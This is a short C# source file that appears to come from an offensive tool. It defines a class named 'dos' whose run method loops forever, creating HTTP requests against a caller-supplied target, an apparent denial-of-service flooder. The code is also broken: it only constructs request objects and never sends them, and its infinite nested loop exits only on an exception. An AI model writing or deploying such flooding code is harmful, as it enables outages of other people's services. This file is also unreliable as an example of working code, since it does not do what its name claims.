using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using System.Web;
using System.Windows.Forms;

namespace Radion
{
    internal class dos
    {
        public void run(string ip)
        {
            for (; ; )
            {
                while (true)
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(ip);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error");
                        break;
                    }


                }
            }
            
        }
    }
}
